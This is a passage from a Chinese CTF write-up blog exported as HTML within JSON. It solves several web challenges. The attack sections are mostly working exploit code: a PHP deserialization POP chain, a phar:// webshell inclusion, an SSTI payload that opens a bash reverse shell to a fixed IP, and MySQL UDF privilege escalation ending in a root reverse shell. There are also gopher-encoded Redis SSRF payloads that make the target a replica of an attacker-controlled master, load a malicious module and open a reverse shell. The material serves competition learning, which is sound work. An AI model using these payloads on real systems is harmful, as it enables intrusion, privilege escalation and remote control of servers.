class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"><span class=\"comment\">//you should find flag in you self</span></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">one</span></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"variable\">$a</span>;</span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">new</span>(<span class=\"params\"></span>)</span>&#123;</span><br><span class=\"line\">        <span class=\"title function_ invoke__\">printf</span>(<span class=\"string\">&quot;i am new baby&quot;</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__wakeup</span>(<span class=\"params\"></span>)</span></span><br><span class=\"line\"><span class=\"function\">    </span>&#123;</span><br><span class=\"line\">        <span class=\"variable language_\">$this</span>-&gt;a-&gt;<span class=\"keyword\">new</span>();</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">two</span></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"variable\">$func</span>;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"variable\">$arg</span>;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__call</span>(<span class=\"params\"><span class=\"variable\">$func</span>,<span class=\"variable\">$arg</span></span>)</span></span><br><span class=\"line\"><span class=\"function\">    </span>&#123;</span><br><span class=\"line\">        <span class=\"variable language_\">$this</span>-&gt;func-&gt;arg;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">three</span></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"variable\">$kkk</span>;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__get</span>(<span class=\"params\"><span class=\"variable\">$kkk</span></span>)</span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"string\">&quot;look!you are hero&quot;</span>.<span class=\"variable language_\">$this</span>-&gt;kkk;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">four</span> </span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"variable\">$s</span>;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">eval</span>(<span class=\"params\"></span>)</span></span><br><span class=\"line\"><span class=\"function\">    </span>&#123;</span><br><span class=\"line\">        <span class=\"variable\">$pattern</span> = <span class=\"string\">&quot;/(ls|c|a|t| |f|i|n|d&#x27;)/&quot;</span>;</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (<span class=\"title function_ invoke__\">preg_match</span>(<span class=\"variable\">$pattern</span>, <span class=\"variable\">$this</span>-&gt;s)) &#123;</span><br><span class=\"line\">            <span class=\"keyword\">print</span>(<span class=\"string\">&quot;oh nonono hacker!&quot;</span>);</span><br><span class=\"line\">            <span class=\"keyword\">return</span> <span class=\"string\">&#x27;&#x27;</span>;</span><br><span class=\"line\">        &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">            <span class=\"keyword\">return</span> <span class=\"title function_ invoke__\">system</span>(<span class=\"variable\">$this</span>-&gt;s);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__toString</span>(<span class=\"params\"></span>) </span>&#123;</span><br><span class=\"line\">        <span class=\"variable language_\">$this</span>-&gt;<span class=\"keyword\">eval</span>();</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"string\">&#x27;aaaa&#x27;</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"variable\">$obj_one</span> = <span class=\"keyword\">new</span> <span class=\"title function_ invoke__\">one</span>();</span><br><span class=\"line\"><span class=\"variable\">$obj_two</span> = <span class=\"keyword\">new</span> <span class=\"title function_ invoke__\">two</span>();</span><br><span class=\"line\"><span class=\"variable\">$obj_three</span> = <span class=\"keyword\">new</span> <span class=\"title function_ invoke__\">three</span>();</span><br><span class=\"line\"><span class=\"variable\">$obj_four</span> = <span class=\"keyword\">new</span> <span class=\"title function_ invoke__\">four</span>();</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// Set up the chain</span></span><br><span class=\"line\"><span class=\"variable\">$obj_four</span>-&gt;s = <span class=\"string\">&quot;more\t/*&quot;</span>;</span><br><span class=\"line\"><span class=\"variable\">$obj_three</span>-&gt;kkk = <span class=\"variable\">$obj_four</span>;</span><br><span class=\"line\"><span class=\"variable\">$obj_two</span>-&gt;func = <span class=\"variable\">$obj_three</span>;</span><br><span class=\"line\"><span class=\"variable\">$obj_one</span>-&gt;a = <span class=\"variable\">$obj_two</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"variable\">$pop</span> = <span class=\"title function_ invoke__\">serialize</span>(<span class=\"variable\">$obj_one</span>);</span><br><span class=\"line\"><span class=\"keyword\">print</span>(<span class=\"title function_ invoke__\">base64_encode</span>(<span class=\"variable\">$pop</span>));</span><br><span class=\"line\"><span class=\"comment\">//unserialize($pop);</span></span><br></pre></td></tr></table></figure>\n\n\n\n<h1 id=\"NISACTF-2022\"><a href=\"#NISACTF-2022\" class=\"headerlink\" title=\"NISACTF 2022\"></a>NISACTF 2022</h1><h2 id=\"bingdundun\"><a href=\"#bingdundun\" class=\"headerlink\" title=\"bingdundun~\"></a>bingdundun~</h2><p><strong>文件上传和包含结合例题</strong></p>\n<p><a href=\"https://www.nssctf.cn/problem/2026\">https://www.nssctf.cn/problem/2026</a> </p>\n<p>将shell压缩成zip进行上传</p>\n<p><img src=\"/post/%E8%B5%9B%E4%BA%8B%E6%80%BB%E7%BB%93/image-20240531151621977.png\" alt=\"image-20240531151621977\"></p>\n<p>上传之后用<strong>phar伪协议</strong>来<strong>解压出</strong>该文件中的<strong>内容</strong></p>\n<p>最终payload:</p>\n<p>GET:  <strong>?bingdundun&#x3D;phar:&#x2F;&#x2F;494ff243b2fc65c01462174e09e95088.zip&#x2F;web</strong></p>\n<p><strong>连接蚁剑即可</strong></p>\n<h2 id=\"babyupload\"><a href=\"#babyupload\" class=\"headerlink\" title=\"babyupload\"></a>babyupload</h2><h3 id=\"CVE-2020-35736\"><a href=\"#CVE-2020-35736\" class=\"headerlink\" title=\"CVE-2020-35736\"></a>CVE-2020-35736</h3><h3 id=\"利用-os-path-join-处理路径的拼接问题\"><a href=\"#利用-os-path-join-处理路径的拼接问题\" class=\"headerlink\" title=\"利用 os.path.join 处理路径的拼接问题\"></a>利用 os.path.join 处理路径的拼接问题</h3><p> <a href=\"https://www.nssctf.cn/problem/2025\">https://www.nssctf.cn/problem/2025</a></p>\n<p> <code>file_path = os.path.join(&quot;var&quot;, &quot;lib&quot;, filename)</code></p>\n<p>传入文件会自动拼接**&#x2F;var&#x2F;lib&#x2F;$filename** </p>\n<p>如果变量名前有**&#x2F;<strong>，os.path.join会</strong>忽略掉var&#x2F;lib** </p>\n<p>eg:</p>\n<p>$filename&#x3D;<strong>&#x2F;flag</strong> </p>\n<p>读取路径为&#x2F;flag (<strong>直接读取根目录的flag isset</strong>)</p>\n<h3 id=\"babyserialize\"><a href=\"#babyserialize\" class=\"headerlink\" title=\"babyserialize\"></a>babyserialize</h3><h4 id=\"pop-4对象\"><a href=\"#pop-4对象\" class=\"headerlink\" title=\"pop 4对象\"></a>pop 4对象</h4><p> <a href=\"https://www.nssctf.cn/problem/1852\">https://www.nssctf.cn/problem/1852</a></p>\n<h1 id=\"2024年春秋杯网络安全联赛夏季赛\"><a href=\"#2024年春秋杯网络安全联赛夏季赛\" class=\"headerlink\" title=\"2024年春秋杯网络安全联赛夏季赛\"></a>2024年春秋杯网络安全联赛夏季赛</h1><h2 id=\"brother\"><a href=\"#brother\" class=\"headerlink\" title=\"brother\"></a>brother</h2><h3 id=\"直接fenjing一把梭\"><a href=\"#直接fenjing一把梭\" class=\"headerlink\" title=\"直接fenjing一把梭\"></a>直接fenjing一把梭</h3><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&#123;&#123;cycler.next.__globals__.__builtins__.__import__(&#x27;os&#x27;).popen(&quot;bash -c &#x27;bash -i &gt;&amp; /dev/tcp/156.238.233.41/8888 0&gt;&amp;1&#x27;&quot;).read()&#125;&#125;</span><br></pre></td></tr></table></figure>\n\n<p>进行反弹shell到服务器上</p>\n<h3 id=\"UDF提权\"><a href=\"#UDF提权\" class=\"headerlink\" title=\"UDF提权\"></a>UDF提权</h3><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"built_in\">cat</span> /flag  <span class=\"comment\">#发现权限不够</span></span><br><span class=\"line\"></span><br><span class=\"line\">ss -tuln   <span class=\"comment\">#查看端口</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"built_in\">cat</span> api.py <span class=\"comment\">#发现mysql用户和密码</span></span><br></pre></td></tr></table></figure>\n\n<p>发现<strong>6666开启mysql服务</strong></p>\n<p>可以尝试进行<strong>UDF提权</strong></p>\n<p>服务器开启http服务</p>\n<p>将lib_mysqludf_sys_64.so文件传输到靶机上</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">mysql -uctf -p123456 -P 6666 -D mysql -e <span class=\"string\">&quot;select @@version_compile_os, @@version_compile_machine;&quot;</span></span><br><span class=\"line\"></span><br><span class=\"line\">mysql -uctf -p123456 -P 6666 -D mysql -e <span class=\"string\">&quot;show variables like &#x27;%plugin%&#x27;;&quot;</span></span><br><span class=\"line\"></span><br><span class=\"line\">mysql -uctf -p123456 -P 6666 -D mysql -e <span class=\"string\">&quot;create table foo(line blob);&quot;</span></span><br><span class=\"line\"></span><br><span class=\"line\">mysql -uctf -p123456 -P 6666 -D mysql -e <span class=\"string\">&quot;insert into foo values(load_file(&#x27;/tmp/lib_mysqludf_sys_64.so&#x27;));&quot;</span></span><br><span class=\"line\"></span><br><span class=\"line\">mysql -uctf -p123456 -P 6666 -D mysql -e <span class=\"string\">&quot;select * from foo into dumpfile &#x27;/usr/lib/mysql/plugin/udf.so&#x27;;&quot;</span></span><br><span class=\"line\"></span><br><span class=\"line\">mysql -uctf -p123456 -P 6666 -D mysql -e <span class=\"string\">&quot;CREATE FUNCTION sys_eval RETURNS STRING SONAME &#x27;udf.so&#x27;;&quot;</span></span><br><span class=\"line\"></span><br><span class=\"line\">mysql -uctf -p123456 -P 6666 -D mysql -e <span class=\"string\">&quot;select * from mysql.func;&quot;</span></span><br><span class=\"line\"></span><br><span class=\"line\">mysql -uctf -p123456 -P 6666 -D mysql -e <span class=\"string\">&quot;select sys_eval(&#x27;whoami&#x27;);&quot;</span> <span class=\"comment\">#返回 root</span></span><br></pre></td></tr></table></figure>\n\n<p>创建函数成功，进行反弹rootshell</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">mysql -uctf -p123456 -P 6666 -D mysql -e <span class=\"string\">&quot;select sys_eval(&#x27;bash -c \\\\&#x27;bash -i &gt;&amp; /dev/tcp/156.238.233.41/9999 0&gt;&amp;1\\\\&#x27;&#x27;);&quot;</span>  </span><br><span class=\"line\"><span class=\"comment\">#  \\\\&#x27; 对单引号进行转义</span></span><br></pre></td></tr></table></figure>\n\n<p>接受shell，<strong>cat &#x2F;flag</strong></p>\n<h1 id=\"2020网鼎杯\"><a href=\"#2020网鼎杯\" class=\"headerlink\" title=\"2020网鼎杯\"></a>2020网鼎杯</h1><h2 id=\"SSRFMe\"><a href=\"#SSRFMe\" class=\"headerlink\" title=\"SSRFMe\"></a>SSRFMe</h2><h3 id=\"SSRF之Redis主从复制实现RCE\"><a href=\"#SSRF之Redis主从复制实现RCE\" class=\"headerlink\" title=\"SSRF之Redis主从复制实现RCE\"></a>SSRF之Redis主从复制实现RCE</h3><h3 id=\"redis常用命令\"><a href=\"#redis常用命令\" class=\"headerlink\" title=\"redis常用命令\"></a>redis常用命令</h3><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">set xz &quot;Hacker&quot;                     # 设置键xz的值为字符串Hacker</span><br><span class=\"line\">get xz                              # 获取键xz的内容</span><br><span class=\"line\">SET score 857                       # 设置键score的值为857</span><br><span class=\"line\">INCR score                          # 使用INCR命令将score的值增加1</span><br><span class=\"line\">GET score                           # 获取键score的内容</span><br><span class=\"line\">keys *                              # 列出当前数据库中所有的键</span><br><span class=\"line\">config set protected-mode no        # 关闭安全模式</span><br><span class=\"line\">get anotherkey                      # 获取一个不存在的键的值</span><br><span class=\"line\">config set dir /root/redis          # 设置保存目录</span><br><span class=\"line\">config set dbfilename redis.rdb     # 设置保存文件名</span><br><span class=\"line\">config get dir                      # 查看保存目录</span><br><span class=\"line\">config get dbfilename               # 查看保存文件名</span><br><span class=\"line\">save                                # 进行一次备份操作</span><br><span class=\"line\">flushall                            # 删除所有数据</span><br><span class=\"line\">del key                             # 删除键为key的数据</span><br><span class=\"line\">slaveof ip port                     # 设置主从关系</span><br><span class=\"line\">redis-cli -h ip -p 6379 -a passwd   # 外部连接</span><br></pre></td></tr></table></figure>\n\n<p>主从复制是指将一台Redis主服务器的数据，复制到其他的Redis从服务器。前者称为主节点(master)，后者称为从节点(slave)；</p>\n<p>所有的<strong>数据修改</strong>只<strong>在主服务器</strong>上进行，然后将最新的<strong>数据同步</strong>给<strong>从服务器</strong>，这样就使得<strong>主从服务器的数据是一致</strong>的</p>\n<h3 id=\"建立主从复制，有3种方式：\"><a href=\"#建立主从复制，有3种方式：\" class=\"headerlink\" title=\"建立主从复制，有3种方式：\"></a>建立主从复制，有3种方式：</h3><ol>\n<li><p>配置文件写入 <code>slaveof &lt;master_ip&gt; &lt;master_port&gt;</code></p>\n</li>\n<li><p>redis-server启动命令后加入 <code>--slaveof &lt;master_ip&gt; &lt;master_port&gt;</code></p>\n</li>\n<li><p>连接到客户端之后执行 <code>slaveof &lt;master_ip&gt; &lt;master_port&gt;</code></p>\n</li>\n</ol>\n<p>  PS：建立主从关系只需要在从节点操作就行了，主节点不用任何操作</p>\n<h3 id=\"使用exp进行rce\"><a href=\"#使用exp进行rce\" class=\"headerlink\" title=\"使用exp进行rce\"></a>使用exp进行rce</h3><p>预先通过内网穿透将端口（8009）映射到公网上</p>\n<p>使用 <strong>Redis 远程代码执行脚本</strong>开启服务</p>\n<p>使用说明</p>\n<p><a href=\"https://blog.csdn.net/gitblog_09313/article/details/142229727\">https://blog.csdn.net/gitblog_09313/article/details/142229727</a></p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">python3 redis_rogue_server.py -v -path exp.so -lport 8009</span><br></pre></td></tr></table></figure>\n\n\n\n<h4 id=\"进入到目标目录\"><a href=\"#进入到目标目录\" class=\"headerlink\" title=\"进入到目标目录\"></a>进入到目标目录</h4><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">gopher://0.0.0.0:6379/_auth%2520root%250Aconfig%2520set%2520dir%2520%252Ftmp%252F%250Aquit</span><br><span class=\"line\"></span><br><span class=\"line\">_auth root</span><br><span class=\"line\">config set dir /tmp/ #tmp目录有相应权限</span><br><span class=\"line\">quit</span><br></pre></td></tr></table></figure>\n\n<h4 id=\"从本地添加文件\"><a href=\"#从本地添加文件\" class=\"headerlink\" title=\"从本地添加文件\"></a>从本地添加文件</h4><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">gopher://0.0.0.0:6379/_auth%2520root%250Aconfig%2520set%2520dbfilename%2520exp.so%250Aslaveof%2520121.43.126.238%25208009%2520%2520%250Aquit</span><br><span class=\"line\"></span><br><span class=\"line\">_auth root</span><br><span class=\"line\">config set dbfilename exp.so</span><br><span class=\"line\">slaveof 121.43.126.238 8009  #公网ip， 开启主服务</span><br><span class=\"line\">quit</span><br></pre></td></tr></table></figure>\n\n<h4 id=\"加载exp\"><a href=\"#加载exp\" class=\"headerlink\" title=\"加载exp\"></a>加载exp</h4><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">gopher://0.0.0.0:6379/_auth%2520root%250Amodule%2520load%2520.%252Fexp.so%250Aquit</span><br><span class=\"line\"></span><br><span class=\"line\">_auth root</span><br><span class=\"line\">module load ./exp.so</span><br><span class=\"line\">quit</span><br></pre></td></tr></table></figure>\n\n<h4 id=\"rce\"><a href=\"#rce\" class=\"headerlink\" title=\"rce\"></a>rce</h4><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">gopher://0.0.0.0:6379/_auth%2520root%250Asystem.exec%2520%2522cat%2520%252Fflag%2522%250Aquit</span><br><span class=\"line\"></span><br><span class=\"line\">_auth root</span><br><span class=\"line\">system.exec &quot;cat /flag&quot;</span><br><span class=\"line\">quit</span><br></pre></td></tr></table></figure>\n\n<h4 id=\"以上三个命令可以合并\"><a href=\"#以上三个命令可以合并\" class=\"headerlink\" title=\"以上三个命令可以合并\"></a>以上三个命令可以合并</h4><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">gopher://0.0.0.0:6379/_auth%2520root%250Aconfig%2520set%2520dir%2520%252Ftmp%252F%250Aconfig%2520set%2520dbfilename%2520exp.so%250Aslaveof%2520121.43.126.238%25208009%250Amodule%2520load%2520.%252Fexp.so%250Asystem.exec%2520%2522cat%2520%252Fflag%2522%250Aquit</span><br><span class=\"line\"></span><br><span class=\"line\">_auth root</span><br><span class=\"line\">config set dir /tmp/</span><br><span class=\"line\">config set dbfilename exp.so</span><br><span class=\"line\">slaveof 121.43.126.238 8009</span><br><span class=\"line\">module load ./exp.so</span><br><span class=\"line\">system.exec &quot;cat /flag&quot;</span><br><span class=\"line\">quit</span><br></pre></td></tr></table></figure>\n\n<h4 id=\"也可以进行反弹shell\"><a href=\"#也可以进行反弹shell\" class=\"headerlink\" title=\"也可以进行反弹shell\"></a>也可以进行反弹shell</h4><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">gopher://0.0.0.0:6379/_auth%2520root%250Asystem.rev%2520121.43.126.238%2520%25208888%250Aquit</span><br><span class=\"line\"></span><br><span class=\"line\">#上述payload的解码结果</span><br><span class=\"line\">_auth root</span><br><span class=\"line\">system.rev 121.43.126.238  8888</span><br><span class=\"line\">quit</span><br></pre></td></tr></table></figure>\n\n<h1 id=\"2023蓝桥杯WP\"><a href=\"#2023蓝桥杯WP\" class=\"headerlink\" title=\"2023蓝桥杯WP\"></a>2023蓝桥杯WP</h1><h2 id=\"1-爬虫协议\"><a href=\"#1-爬虫协议\" class=\"headerlink\" title=\"1.爬虫协议\"></a>1.爬虫协议</h2><p>url输入robots.txt</p>\n<p><img src=\"/post/%E8%B5%9B%E4%BA%8B%E6%80%BB%E7%BB%93/image-20240427113956319.png\" alt=\"image-20240427113956319\"></p>\n<p>将最下边一行再输入url</p>\n<p><img src=\"/post/%E8%B5%9B%E4%BA%8B%E6%80%BB%E7%BB%93/image-20240427114121332.png\" alt=\"image-20240427114121332\"></p>\n<p>访问文件即可</p>\n<h2 id=\"2-packet\"><a href=\"#2-packet\" class=\"headerlink\" title=\"2.packet\"></a>2.packet</h2><p><img src=\"/post/%E8%B5%9B%E4%BA%8B%E6%80%BB%E7%BB%93/image-20240427114227952.png\" alt=\"image-20240427114227952\"></p>\n<p>追踪TCP流 第十九个 base64解密即可</p>\n<p><img src=\"/post/%E8%B5%9B%E4%BA%8B%E6%80%BB%E7%BB%93/image-20240427114318405.png\" alt=\"image-20240427114318405\"></p>\n<h2 id=\"3-cc\"><a href=\"#3-cc\" class=\"headerlink\" title=\"3.cc\"></a>3.cc</h2><p>通过附件可知是aes加密</p>\n<p>通过工具解密即可</p>\n<p><img src=\"/post/%E8%B5%9B%E4%BA%8B%E6%80%BB%E7%BB%93/image-20240427114422197.png\" alt=\"image-20240427114422197\"></p>\n","feature":true,"text":"Ctf经验及其题目总结l 做题经验：不要忽略index.php** 和查看源代码 l robots.txt l Sql先测闭合和和注释符 MD5各姿势绕过1.判...","permalink":"/post/赛事总结","photos":[],"count_time":{"symbolsCount":"70k","symbolsTime":"1:04"},"categories":[{"name":"赛事总结","slug":"赛事总结","count":1,"path":"api/categories/赛事总结.json"}],"tags":[{"name":"赛事总结","slug":"赛事总结","count":1,"path":"api/tags/赛事总结.json"}],"toc":"<ol class=\"toc\"><li class=\"toc-item toc-level-1\"><a class=\"toc-link\" href=\"#Ctf%E7%BB%8F%E9%AA%8C%E5%8F%8A%E5%85%B6%E9%A2%98%E7%9B%AE%E6%80%BB%E7%BB%93\"><span class=\"toc-text\">Ctf经验及其题目总结</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#MD5%E5%90%84%E5%A7%BF%E5%8A%BF%E7%BB%95%E8%BF%87\"><span class=\"toc-text\">MD5各姿势绕过</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#1-%E5%88%A4%E6%96%AD%E6%98%AF%E5%90%A6%E4%B8%BAMD5%E7%9A%84%E5%85%B3%E9%94%AE%E5%AD%97\"><span class=\"toc-text\">1.判断是否为MD5的关键字</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#2-MD5%E6%AF%94%E8%BE%83-%EF%BC%88%E5%8F%8C-%EF%BC%89\"><span class=\"toc-text\">2.MD5比较 （双&#x3D;&#x3D;）</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#3%EF%BC%9A-a-b-md5-a-md5-b\"><span class=\"toc-text\">3：$a !&#x3D; $b &amp;&amp; md5($a) &#x3D;&#x3D; md5($b)</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#4%EF%BC%9A-%E5%BC%BA%E7%B1%BB%E5%9E%8B%E6%AF%94%E8%BE%83\"><span class=\"toc-text\">4：&#x3D;&#x3D;&#x3D;强类型比较</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#5-md5-a-md5-md5-b\"><span class=\"toc-text\">5.md5($a) &#x3D;&#x3D; md5(md5($b)</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#4-a-md5-a\"><span class=\"toc-text\">4.$a&#x3D;&#x3D;md5($a)</span></a></li></ol></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#php-%E5%BC%B1%E7%B1%BB%E5%9E%8B%E6%80%BB%E7%BB%93\"><span class=\"toc-text\">php 弱类型总结</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#md5\"><span class=\"toc-text\">md5</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#json-%E7%BB%95%E8%BF%87\"><span class=\"toc-text\">json 绕过</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#array-search%EF%BC%88%EF%BC%89-%E7%BB%95%E8%BF%87\"><span class=\"toc-text\">array_search（） 绕过</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#strcmp%EF%BC%88%EF%BC%89%E7%BB%95%E8%BF%87\"><span class=\"toc-text\">strcmp（）绕过</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#switch%EF%BC%88%EF%BC%89%E7%BB%95%E8%BF%87\"><span class=\"toc-text\">switch（）绕过</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#%E6%88%90%E4%B9%9F%E5%B8%83%E5%B0%94%EF%BC%8C%E8%B4%A5%E4%B9%9F%E5%B8%83%E5%B0%94\"><span class=\"toc-text\">成也布尔，败也布尔</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#intval%E7%BB%95%E8%BF%87\"><span class=\"toc-text\">intval绕过</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#linux-rce%E7%A9%BA%E6%A0%BC%E7%BB%95%E8%BF%87\"><span class=\"toc-text\">linux rce空格绕过</span></a></li></ol></li></ol></li><li class=\"toc-item toc-level-1\"><a class=\"toc-link\" href=\"#XYCTF\"><span class=\"toc-text\">XYCTF</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#ezpop\"><span class=\"toc-text\">ezpop</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#GC%EF%BC%88%E5%9E%83%E5%9C%BE%E5%9B%9E%E6%94%B6%EF%BC%89\"><span class=\"toc-text\">GC（垃圾回收）</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#CG%E4%B8%8E%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%9A%84%E5%88%A9%E7%94%A8\"><span class=\"toc-text\">CG与反序列化的利用</span></a></li><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#%E5%88%A9%E7%94%A8PHP%E5%9E%83%E5%9C%BE%E5%9B%9E%E6%94%B6%E6%9C%BA%E5%88%B6%E6%9E%84%E9%80%A0pop\"><span class=\"toc-text\">利用PHP垃圾回收机制构造pop</span></a></li><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#%E5%8A%A8%E6%80%81%E5%87%BD%E6%95%B0%E6%89%A7%E8%A1%8C%E8%AF%AD%E5%8F%A5\"><span class=\"toc-text\">动态函数执行语句</span></a></li></ol></li></ol></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" 